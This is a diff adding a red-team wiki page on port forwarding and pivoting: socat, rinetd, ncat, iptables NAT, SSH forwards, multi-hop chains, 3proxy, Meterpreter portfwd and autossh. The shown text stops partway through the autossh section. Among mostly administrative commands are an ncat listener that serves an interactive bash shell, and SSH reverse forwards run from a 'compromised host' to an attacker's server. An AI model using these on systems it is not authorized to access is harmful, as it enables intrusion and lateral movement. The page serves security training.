@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Port Forwarding | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Port Forwarding">
+		<meta name="keywords" content="iptables, nat, ncat, pivoting, port-forwarding, portfw, redteam, relay, rinetd, socat, ssh">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Port Forwarding">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Redirecting TCP and UDP connections from one socket to another - socat, rinetd, iptables NAT, SSH, chaining, and persistence techniques for relay-based access.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/port-forwarding.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Port Forwarding">
+		<meta name="twitter:description" itemprop="description" content="Redirecting TCP and UDP connections from one socket to another - socat, rinetd, iptables NAT, SSH, chaining, and persistence techniques for relay-based access.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-relay-mindset">The Relay Mindset</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#socat-the-universal-relay">socat - The Universal Relay</a></b>
+					<ul>
+						<li><a href="#basic-tcp-forwarding">Basic TCP Forwarding</a></li>
+						<li><a href="#reverse-direction-connect-back-relay">Reverse Direction - Connect-Back Relay</a></li>
+						<li><a href="#socat-with-ssltls">socat with SSL/TLS</a></li>
+						<li><a href="#udp-forwarding">UDP Forwarding</a></li>
+						<li><a href="#exec-based-relays">Exec-Based Relays</a></li>
+						<li><a href="#proxy-aware-forwarding">Proxy-Aware Forwarding</a></li>
+						<li><a href="#logging-and-debugging">Logging and Debugging</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#rinetd-simple-reliable-tcp-redirector">rinetd - Simple, Reliable TCP Redirector</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ncat-openbsd-netcat-extended">ncat - OpenBSD netcat Extended</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#iptables-nat-port-forwarding">iptables NAT Port Forwarding</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ssh-port-forwarding-in-practice">SSH Port Forwarding in Practice</a></b>
+					<ul>
+						<li><a href="#access-internal-rdp-through-ssh">Access Internal RDP Through SSH</a></li>
+						<li><a href="#access-internal-web-application">Access Internal Web Application</a></li>
+						<li><a href="#make-a-local-service-public">Make a Local Service Public</a></li>
+						<li><a href="#ssh-forward-via-netcat">SSH Forward via netcat</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#port-forwarding-chains">Port Forwarding Chains</a></b>
+					<ul>
+						<li><a href="#step-by-step-chain-construction">Step-by-step chain construction</a></li>
+						<li><a href="#chain-with-socat">Chain with socat</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#3proxy-proxy-and-forwarder">3proxy - Proxy and Forwarder</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#meterpreter-port-forwarding">Meterpreter Port Forwarding</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#socks-plus-port-forwarding">SOCKS Plus Port Forwarding</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#dynamic-vs-static-port-forwarding">Dynamic vs Static Port Forwarding</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#maintaining-forwarded-ports">Maintaining Forwarded Ports</a></b>
+					<ul>
+						<li><a href="#autossh-automatic-ssh-tunnel-restart">autossh - Automatic SSH Tunnel Restart</a></li>
+						<li><a href="#systemd-unit-for-socat">systemd Unit for socat</a></li>
+						<li><a href="#systemd-service-for-ssh-tunnel">systemd Service for SSH Tunnel</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#port-forwarding-detection">Port Forwarding Detection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/port-forwarding.html">Port Forwarding</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="port-forwarding">Port Forwarding</h2>
+					<p>
+						Redirecting
+						<abbr title="Transmission Control Protocol">TCP</abbr>
+						and
+						<abbr title="User Datagram Protocol">UDP</abbr>
+						connections
+						from one socket to another - socat, rinetd, iptables
+						<abbr title="Network Address Translation">NAT</abbr>
+						,
+						<abbr title="Secure Shell">SSH</abbr>
+						, chaining, and persistence techniques for relay-based access.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Port forwarding moves bytes between two sockets: a connection arrives at one port and is replayed
+							out another. This article covers the relay tools (socat, rinetd, ncat, 3proxy), kernel-level
+							<abbr title="Network Address Translation">NAT</abbr>
+							with iptables,
+							<abbr title="Secure Shell">SSH</abbr>
+							
+							<code>-L</code>
+							and
+							<code>-R</code>
+							forwards,
+							multi-hop chains, and how to keep a forward alive. After reading you can expose an internal
+							service through a jump host and explain how each hop resolves the connection.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/tcp-handshake.html">TCP Handshake</a> - <abbr title="Transmission Control Protocol">TCP</abbr> three-way handshake, sequence numbers, connection lifecycle</li>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - process I/O, file descriptors, fork/exec, /proc/PID/fd</li>
+							<li><a href="/wiki/articles/fundamentals/authentication.html">Authentication</a> - credential types, <abbr title="Secure Shell">SSH</abbr> key formats, agent forwarding</li>
+							<li><a href="/wiki/articles/fundamentals/networking.html">Networking</a> - <abbr title="Internet Protocol">IP</abbr> addressing, routing tables, iptables chains and tables</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-relay-mindset">The Relay Mindset</h3>
+						<p>
+							Port forwarding is the simplest pivot primitive: a
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							connection
+							arrives at socket A, and the bytes are replayed out socket B. No encapsulation, no protocol
+							wrapping - just a raw byte stream moved between two sockets. This makes port forwarding fast
+							(no encoding overhead) but detectable (the protocol at the destination is the protocol seen
+							at the relay).
+						</p>
+						<p>Every port forward is defined by four parameters:</p>
+						<pre class="plaintext">
+┌──────────────┐       ┌──────────────┐       ┌──────────────┐
+│ Source Host  │──────►│ Relay Host   │──────►│ Target Host  │
+│ connects to  │       │ listens on   │       │ final dest   │
+│ relay:P_LIST │       │ P_LIST       │       │ T_HOST:T_PORT│
+└──────────────┘       └──────────────┘       └──────────────┘
+						</pre>
+						<ul>
+							<li><b>P_LIST</b> : The port the relay listens on (the "inbound" side)</li>
+							<li><b>T_HOST:T_PORT</b> : The destination address:port (the "outbound" side)</li>
+							<li><b>Transport</b> : <abbr title="Transmission Control Protocol">TCP</abbr> or <abbr title="User Datagram Protocol">UDP</abbr></li>
+							<li><b>Mode</b> : Fork (handle concurrent connections) or single-shot</li>
+						</ul>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="socat-the-universal-relay">socat - The Universal Relay</h3>
+						<p>
+							socat connects two bidirectional byte streams. Unlike netcat (which connects STDIN/STDOUT to
+							a single socket), socat connects two arbitrary endpoints - sockets, files, pipes, exec'd processes,
+							<abbr title="Secure Sockets Layer">SSL</abbr>
+							sessions, proxies, TUN interfaces.
+						</p>
+						<p>
+							The core syntax:
+							<code>socat ENDPOINT_A ENDPOINT_B</code>
+							. Data flows bidirectionally between them.
+						</p>
+						<h4 id="basic-tcp-forwarding">Basic TCP Forwarding</h4>
+						<pre class="bash">
+# Forward localhost:4444 to remote-host:80
+# fork: handle multiple connections (without fork, socat exits after first disconnect)
+# reuseaddr: allow immediate rebind after shutdown (avoids TIME_WAIT)
+socat TCP4-LISTEN:4444,fork,reuseaddr TCP4:remote-host.example.com:80
+
+# Test:
+curl http://localhost:4444          # Reaches remote-host:80
+
+# Bind to specific interface:
+socat TCP4-LISTEN:4444,bind=10.0.0.100,fork,reuseaddr TCP4:10.0.1.50:22
+
+# Limit concurrent connections:
+socat TCP4-LISTEN:4444,fork,reuseaddr,max-children=5 TCP4:target:80
+						</pre>
+						<h4 id="reverse-direction-connect-back-relay">Reverse Direction - Connect-Back Relay</h4>
+						<p>
+							When the target can reach the relay but the relay cannot directly reach the target (egress filtering),
+							invert the direction. The target makes the outbound connection; socat bridges it to a local
+							listener.
+						</p>
+						<pre class="bash">
+# On relay host — listen for target&#39;s connect-back:
+socat TCP4-LISTEN:5555,fork,reuseaddr TCP4-LISTEN:4444,fork,reuseaddr
+# Wait... target connects to relay:5555. Now port 4444 is bridged to target.
+
+# On target host (behind restrictive egress):
+socat TCP4:relay.example.com:5555 TCP4:localhost:80
+# Any connection to relay:4444 now reaches target:80
+						</pre>
+						<p>
+							This is the "poor man's reverse tunnel" - no
+							<abbr title="Secure Shell">SSH</abbr>
+							required.
+						</p>
+						<h4 id="socat-with-ssltls">socat with SSL/TLS</h4>
+						<pre class="bash">
+# Generate cert (one-liner):
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
+    -subj &#34;/CN=relay&#34; -keyout relay.key -out relay.crt
+
+# Server — TLS-wrapped forwarder:
+socat OPENSSL-LISTEN:443,cert=relay.crt,key=relay.key,verify=0,fork,reuseaddr \
+      TCP4:localhost:80
+
+# Client — connect via TLS and expose as local port:
+socat TCP4-LISTEN:8080,fork,reuseaddr \
+      OPENSSL:relay.example.com:443,verify=0
+curl http://localhost:8080   # → TLS → relay:443 → localhost:80
+
+# Verify server certificate (no verify=0):
+socat TCP4-LISTEN:8080,fork,reuseaddr \
+      OPENSSL:relay.example.com:443,cafile=ca.crt,commonname=relay
+						</pre>
+						<h4 id="udp-forwarding">UDP Forwarding</h4>
+						<pre class="bash">
+# Forward UDP port 53 (DNS) to another DNS server:
+socat UDP4-LISTEN:53,fork,reuseaddr UDP4:8.8.8.8:53
+
+# TCP-to-UDP bridge (TCP client → UDP server):
+socat TCP4-LISTEN:5353,fork,reuseaddr UDP4:dns-server:53
+
+# UDP-to-TCP bridge (UDP client → TCP server):
+socat UDP4-LISTEN:5353,fork,reuseaddr TCP4:dns-over-tls:853
+						</pre>
+						<h4 id="exec-based-relays">Exec-Based Relays</h4>
+						<p>
+							socat can fork a process and connect its STDIN/STDOUT. This enables command forwarding without
+							a shell.
+						</p>
+						<pre class="bash">
+# Execute a command on connection (like inetd):
+socat TCP4-LISTEN:2323,fork,reuseaddr EXEC:/usr/bin/whoami
+
+# Forward incoming connection to an SSH session:
+socat TCP4-LISTEN:2222,fork,reuseaddr \
+      EXEC:&#39;ssh -o StrictHostKeyChecking=no operator@target.internal&#39;,pty,ctty
+
+# Named pipe relay (for IPC between containers):
+mkfifo /tmp/relay_pipe
+socat TCP4-LISTEN:4444,fork,reuseaddr PIPE:/tmp/relay_pipe &amp;
+socat PIPE:/tmp/relay_pipe TCP4:target:22 &amp;
+						</pre>
+						<h4 id="proxy-aware-forwarding">Proxy-Aware Forwarding</h4>
+						<pre class="bash">
+# Forward through HTTP CONNECT proxy:
+socat TCP4-LISTEN:4444,fork,reuseaddr \
+      PROXY:proxy.corp.com:target.internal:443,proxyport=8080
+
+# Forward through SOCKS5 proxy:
+socat TCP4-LISTEN:4444,fork,reuseaddr \
+      SOCKS5:127.0.0.1:target.internal:443,socksport=1080
+
+# Forward with proxy authentication:
+socat TCP4-LISTEN:4444,fork,reuseaddr \
+      PROXY:proxy.corp.com:target:443,proxyport=8080,proxyauth=user:password
+						</pre>
+						<h4 id="logging-and-debugging">Logging and Debugging</h4>
+						<pre class="bash">
+# Log all forwarded traffic to file (forensic trail):
+socat -v TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:80
+# -v: verbose — hex+ASCII dump of all data to STDERR
+
+# Log to separate file:
+socat -x TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:80 2&gt;/var/log/socat.log
+# -x: hex dump only (no ASCII)
+
+# tee-like split: forward AND log to file:
+socat TCP4-LISTEN:4444,fork,reuseaddr \
+      SYSTEM:&#39;tee /tmp/forwarded.bin | socat - TCP4:target:80&#39;
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="rinetd-simple-reliable-tcp-redirector">rinetd - Simple, Reliable TCP Redirector</h3>
+						<p>
+							rinetd is a single-purpose
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							redirector. No
+							<abbr title="Transport Layer Security">TLS</abbr>
+							, no
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							, no scripting - just config-driven
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							forwarding. It's useful when you need a persistent, resource-light relay without socat's complexity.
+						</p>
+						<pre class="bash">
+# Install:
+pacman -S rinetd   # ArchLinux
+
+# Configuration: /etc/rinetd.conf
+# Format: bindaddress bindport connectaddress connectport
+cat &gt; /etc/rinetd.conf &lt;&lt; &#39;EOF&#39;
+# Forward 0.0.0.0:8080 to internal web server
+0.0.0.0  8080  192.168.100.10  80
+
+# Forward localhost:3389 to domain controller
+127.0.0.1  3389  10.0.0.10  3389
+
+# Forward only from specific source IP:
+10.0.0.100  443  172.16.0.5  443
+
+# Logging:
+# logfile /var/log/rinetd.log
+# logcommon (logs all connections)
+EOF
+
+# Start rinetd:
+sudo rinetd -f -c /etc/rinetd.conf
+# -f: foreground (for debugging)
+# Without -f: daemonizes
+
+# Verify forwarding:
+ss -tlnp | grep rinetd
+curl http://localhost:8080
+						</pre>
+						<p>
+							rinetd handles concurrent connections natively (no
+							<code>fork</code>
+							parameter needed). It's a single-process,
+							single-thread event-driven redirector - very efficient.
+						</p>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="ncat-openbsd-netcat-extended">ncat - OpenBSD netcat Extended</h3>
+						<p>
+							ncat (from the nmap project) extends traditional netcat with
+							<abbr title="Secure Sockets Layer">SSL</abbr>
+							, exec,
+							brokering, and access control.
+						</p>
+						<pre class="bash">
+# Install:
+pacman -S nmap   # Includes ncat
+
+# Basic TCP forwarding (acts as relay between two connections):
+ncat -l -k -p 4444 -c &#39;ncat target.internal 80&#39;
+# -l: listen
+# -k: keep listening after client disconnects (like socat fork)
+# -c: execute command, connect its STDIO to the client
+
+# SSL port forward:
+ncat --ssl -l -k -p 4444 -c &#39;ncat target.internal 80&#39;
+ncat --ssl relay.example.com 4444
+
+# Allow only specific source IP:
+ncat -l -k -p 4444 --allow 10.0.0.0/24 -c &#39;ncat target.internal 80&#39;
+
+# Allow multiple sources:
+ncat -l -k -p 4444 --allow 10.0.0.5 --allow 10.0.0.6
+
+# Connection brokering — connect two listeners together:
+ncat -l -k -p 4444 --broker
+# Connect two clients to port 4444. Their streams are bridged.
+
+# Execute shell per connection:
+ncat -l -k -p 4444 --sh-exec &#39;/bin/bash -i&#39;
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="iptables-nat-port-forwarding">iptables NAT Port Forwarding</h3>
+						<p>
+							When the relay host is a router (multiple interfaces,
+							<abbr title="Internet Protocol">IP</abbr>
+							forwarding enabled),
+							iptables
+							<code>DNAT</code>
+							rules provide kernel-level port forwarding with no userspace process. This is
+							faster than socat (kernel-space) but requires root and
+							<abbr title="Internet Protocol">IP</abbr>
+							forwarding.
+						</p>
+						<pre class="bash">
+# Enable IP forwarding:
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+# Persistent:
+echo &#39;net.ipv4.ip_forward=1&#39; &gt;&gt; /etc/sysctl.d/99-redteam.conf
+sysctl -p /etc/sysctl.d/99-redteam.conf
+
+# DNAT: Redirect incoming TCP 8443 to internal host 192.168.1.100:443
+iptables -t nat -A PREROUTING -p tcp --dport 8443 -j DNAT \
+    --to-destination 192.168.1.100:443
+
+# SNAT/MASQUERADE: Rewrite source address so return traffic comes back
+# through the relay. Without this, the internal host tries to reply directly
+# to the original source (which may be unreachable).
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.1.100 --dport 443 \
+    -j MASQUERADE
+
+# Verify:
+iptables -t nat -L -n -v
+curl https://relay-host:8443   # reaches internal:443
+
+# Delete rules:
+iptables -t nat -D PREROUTING -p tcp --dport 8443 -j DNAT \
+    --to-destination 192.168.1.100:443
+iptables -t nat -D POSTROUTING -p tcp -d 192.168.1.100 --dport 443 \
+    -j MASQUERADE
+						</pre>
+						<p>
+							<b>Real-world iptables forward chain</b>
+							- relay accessible on eth0 (10.0.0.1), internal network
+							on eth1 (192.168.1.0/24):
+						</p>
+						<pre class="bash">
+# Forward RDP to internal host:
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 3389 \
+    -j DNAT --to-destination 192.168.1.50:3389
+
+# Forward multiple ports:
+for port in 22 80 443 3389 8080; do
+    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport $port \
+        -j DNAT --to-destination 192.168.1.100:$port
+done
+
+# SNAT for all internal traffic:
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+# Verify routing works:
+# On the service side (internal host), ensure default gateway is the relay:
+# ip route add default via 192.168.1.1  (relay&#39;s internal IP)
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="ssh-port-forwarding-in-practice">SSH Port Forwarding in Practice</h3>
+						<p>
+							Refer to
+							<a href="/wiki/articles/redteam/tunneling.html">Tunneling</a>
+							for
+							<abbr title="Secure Shell">SSH</abbr>
+							tunnel fundamentals.
+							Here we focus on tactical port forwarding usage.
+						</p>
+						<h4 id="access-internal-rdp-through-ssh">Access Internal RDP Through SSH</h4>
+						<pre class="bash">
+# Attacker → jumphost (public IP) → internal DC (10.0.0.10:3389)
+ssh -L 3389:10.0.0.10:3389 operator@jumphost.corp.com
+
+# Connect RDP client to localhost:3389
+xfreerdp /v:localhost:3389 /u:administrator /p:&#39;Password123&#39;
+						</pre>
+						<h4 id="access-internal-web-application">Access Internal Web Application</h4>
+						<pre class="bash">
+# Forward localhost:8080 to the internal wiki server:
+ssh -L 8080:wiki.internal.corp.com:80 operator@jumphost.corp.com
+# Browse to http://localhost:8080
+
+# Forward multiple internal web apps:
+ssh -L 8080:wiki.internal:80 \
+    -L 9090:jenkins.internal:8080 \
+    -L 3000:grafana.internal:3000 \
+    operator@jumphost.corp.com
+						</pre>
+						<h4 id="make-a-local-service-public">Make a Local Service Public</h4>
+						<pre class="bash">
+# On compromised host: expose internal web app (localhost:80) to
+# your public server at port 8080:
+ssh -R 8080:localhost:80 operator@public-server.example.com
+
+# Double-hop: expose internal-server:22 through compromised host:
+# On compromised host:
+ssh -R 2222:internal-server.corp.com:22 operator@public-server.example.com
+# Attacker then connects:
+ssh -p 2222 localhost   # (after SSH-ing into public-server first)
+						</pre>
+						<h4 id="ssh-forward-via-netcat">SSH Forward via netcat</h4>
+						<p>
+							When the
+							<abbr title="Secure Shell">SSH</abbr>
+							server has
+							<code>AllowTcpForwarding no</code>
+							, bypass with raw netcat:
+						</p>
+						<pre class="bash">
+# Start a netcat listener FORWARDING to the SSH server:
+# On jumphost:
+ncat -l -k -p 2323 -c &#39;ncat target.internal 22&#39; &amp;
+
+# Then SSH through the local netcat relay:
+ssh -p 2323 localhost
+# ── OR ── SSH with ProxyCommand to use netcat:
+ssh -o ProxyCommand=&#39;ncat localhost 2323&#39; operator@target.internal
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="port-forwarding-chains">Port Forwarding Chains</h3>
+						<p>
+							Single-hop port forwarding is rarely sufficient. Real networks require multi-hop chains: A ->
+							B -> C -> D. Each hop adds a relay.
+							<abbr title="Secure Shell">SSH</abbr>
+							-L creates each link.
+						</p>
+						<pre class="plaintext">
+Attacker (A)               Relay 1 (B)             Relay 2 (C)            Target (D)
+┌──────────┐  SSH -L  ┌──────────┐  SSH -L  ┌──────────┐  TCP    ┌──────────┐
+│ :4444   ──0───────► :22       ──0───────► :22       ──0────► :80      │
+└──────────┘          └──────────┘          └──────────┘         └──────────┘
+						</pre>
+						<h4 id="step-by-step-chain-construction">Step-by-step chain construction</h4>
+						<pre class="bash">
+# Terminal 1: Relay B → Relay C (establishes hop B→C)
+# On B:
+ssh -L 5555:relay-c.corp.com:22 operator@relay-c.corp.com
+# localhost:5555 on B now → relay-c:22
+
+# Terminal 2: Relay A → Relay B (establishes hop A→B through B→C chain)
+# On A:
+ssh -L 4444:localhost:5555 operator@relay-b.corp.com
+# Wait — this won&#39;t work because we need B&#39;s localhost:5555 to reach C
+
+# CORRECT chain construction:
+# Step 1 — On B: forward B:5555 → C:22
+ssh -L 5555:relay-c.corp.com:22 operator@relay-c.corp.com
+
+# Step 2 — On A: forward A:4444 → B:5555 → C:22
+ssh -L 4444:localhost:5555 operator@relay-b.corp.com
+# localhost:4444 on A → SSH → B:22 → B&#39;s localhost:5555 → C:22
+
+# Step 3 — On A: SSH through the chain to C:
+ssh -p 4444 localhost
+# This lands on Relay C
+
+# Step 4 — From C, forward to final target D:
+ssh -L 8080:target-d.internal:80 operator@relay-c.corp.com
+# Now from A: curl http://localhost:4444 (nested) or set up A&#39;s forwarding:
+ssh -L 8081:localhost:8080 operator@relay-b.corp.com
+						</pre>
+						<h4 id="chain-with-socat">Chain with socat</h4>
+						<pre class="bash">
+# On B: forward B:6666 → C:7777
+socat TCP4-LISTEN:6666,fork,reuseaddr TCP4:relay-c.corp.com:7777 &amp;
+# On C: forward C:7777 → D:80
+socat TCP4-LISTEN:7777,fork,reuseaddr TCP4:target-d.internal:80 &amp;
+
+# From A:
+curl http://relay-b.corp.com:6666   # → B:6666 → C:7777 → D:80
+
+# Chain verification — test each hop individually:
+# On A:         ncat -v relay-b.corp.com 6666  (should time out or connect — check)
+# On B:         ncat -v relay-c.corp.com 7777
+# On C:         ncat -v target-d.internal 80
+# If any hop fails, fix it before continuing.
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="3proxy-proxy-and-forwarder">3proxy - Proxy and Forwarder</h3>
+						<p>
+							3proxy is a tiny proxy server supporting
+							<code>SOCKS</code>
+							,
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							,
+							<abbr title="File Transfer Protocol">FTP</abbr>
+							proxy, and
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							/
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							port forwarding
+							<ul>
+								<li>all in one daemon.</li>
+							</ul>
+						</p>
+						<pre class="bash">
+# Install:
+pacman -S 3proxy   # AUR
+
+# Configuration: /etc/3proxy/3proxy.cfg
+cat &gt; /etc/3proxy/3proxy.cfg &lt;&lt; &#39;EOF&#39;
+# Run as daemon
+daemon
+
+# SOCKS5 proxy on port 1080 (no auth)
+socks -p1080
+
+# HTTP proxy on port 3128
+proxy -p3128
+
+# TCP port forward: incoming :8080 → internal-web:80
+tcppm -i0.0.0.0 8080 internal-web.corp.com 80
+
+# TCP port forward: incoming :3389 → 10.0.0.50:3389
+tcppm -i0.0.0.0 3389 10.0.0.50 3389
+
+# Logging
+log /var/log/3proxy.log D
+logformat &#34;L%d %H:%M:%S %C %U %R %E&#34;
+EOF
+
+# Start:
+sudo 3proxy /etc/3proxy/3proxy.cfg
+
+# Verify:
+ss -tlnp | grep -E &#39;1080|3128|8080|3389&#39;
+						</pre>
+						<p>
+							<b>Advantages of 3proxy over socat:</b>
+							Persistent daemon, single config file, built-in access
+							control, logging. Use 3proxy when you need a multi-service relay that stays up through reboots.
+						</p>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="meterpreter-port-forwarding">Meterpreter Port Forwarding</h3>
+						<p>
+							When operating inside a Meterpreter session,
+							<code>portfwd</code>
+							provides built-in port forwarding:
+						</p>
+						<pre class="plaintext">
+# Within msfconsole, after obtaining a Meterpreter session:
+meterpreter &gt; portfwd add -l 3389 -p 3389 -r 10.0.0.50
+# -l: local port on attacker machine
+# -p: target port on remote host
+# -r: remote target IP (default: localhost of Meterpreter session)
+
+# List active forwards:
+meterpreter &gt; portfwd list
+
+# Remove a forward:
+meterpreter &gt; portfwd delete -l 3389
+
+# Flush all forwards:
+meterpreter &gt; portfwd flush
+
+# Forward to a different host through the compromised session:
+meterpreter &gt; portfwd add -l 8080 -p 80 -r 192.168.100.10
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="socks-plus-port-forwarding">SOCKS Plus Port Forwarding</h3>
+						<p>
+							<code>SOCKS</code>
+							gives you reachability to a network. Port forwarding gives you a dedicated listener.
+							Combine them through proxychains:
+						</p>
+						<pre class="bash">
+# Step 1: Establish SOCKS proxy through pivot host
+ssh -D 1080 operator@pivot.corp.com
+
+# Step 2: Use proxychains to connect to a host in the internal network
+# and set up port forwarding there
+cat &gt; /etc/proxychains4.conf &lt;&lt; &#39;EOF&#39;
+strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+
+# Step 3: Through the SOCKS proxy, SSH into an internal host and create a forward:
+proxychains4 ssh -L 8443:internal-app:443 operator@internal-host.corp.com
+
+# Now you have localhost:8443 → internal-app:443 through the chain:
+#   SSH -L 8443 → internal-host → SOCKS → pivot → attacker
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="dynamic-vs-static-port-forwarding">Dynamic vs Static Port Forwarding</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Feature</th>
+									<th align="center">SSH -L (Static)</th>
+									<th align="center">SSH -D (Dynamic / SOCKS)</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Target selection</td>
+									<td align="center">One target per forward</td>
+									<td align="center">Any target through the proxy</td>
+								</tr>
+								<tr>
+									<td align="center">Protocol support</td>
+									<td align="center">TCP only</td>
+									<td align="center">TCP (SOCKS5)</td>
+								</tr>
+								<tr>
+									<td align="center">Tool support</td>
+									<td align="center">Any TCP client</td>
+									<td align="center">SOCKS-aware tools or proxychains</td>
+								</tr>
+								<tr>
+									<td align="center">Performance</td>
+									<td align="center">Slightly faster (dedicated stream)</td>
+									<td align="center">Per-connection setup overhead</td>
+								</tr>
+								<tr>
+									<td align="center">Stealth</td>
+									<td align="center">Persistent connections visible</td>
+									<td align="center">Multiple short-lived connections</td>
+								</tr>
+								<tr>
+									<td align="center">Use case</td>
+									<td align="center">One specific service (RDP, SSH, DB)</td>
+									<td align="center">General network exploration</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<b>Decision rule:</b>
+							Use
+							<code>-L</code>
+							for a known, long-lived service you need to interact with repeatedly
+							(
+							<abbr title="Remote Desktop Protocol">RDP</abbr>
+							,
+							<abbr title="Secure Shell">SSH</abbr>
+							). Use
+							<code>-D</code>
+							when exploring a network
+							<ul>
+								<li>you don't know which hosts and ports you'll need.</li>
+							</ul>
+						</p>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="maintaining-forwarded-ports">Maintaining Forwarded Ports</h3>
+						<p>
+							Port forwards die when the
+							<abbr title="Secure Shell">SSH</abbr>
+							session drops (network hiccup, server reboot,
+							idle timeout). For persistent access, you need watchdog mechanisms.
+						</p>
+						<h4 id="autossh-automatic-ssh-tunnel-restart">autossh - Automatic SSH Tunnel Restart</h4>
+						<pre class="bash">
+# Install:
+pacman -S autossh
+
+# autossh wrapper: monitors the SSH connection and restarts it
+# ServerAliveInterval: send keepalive every 30s
+# ServerAliveCountMax: disconnect after 2 failed keepalives
+# AUTOSSH_POLL: autossh&#39;s own monitor interval
+autossh -M 0 \
+    -o &#34;ServerAliveInterval=30&#34; \
+    -o &#34;ServerAliveCountMax=2&#34; \
+    -fNL 8080:internal-web:80 operator@jumphost.corp.com
+
+# -M 0: disable autossh&#39;s monitoring port (use SSH keepalives instead)
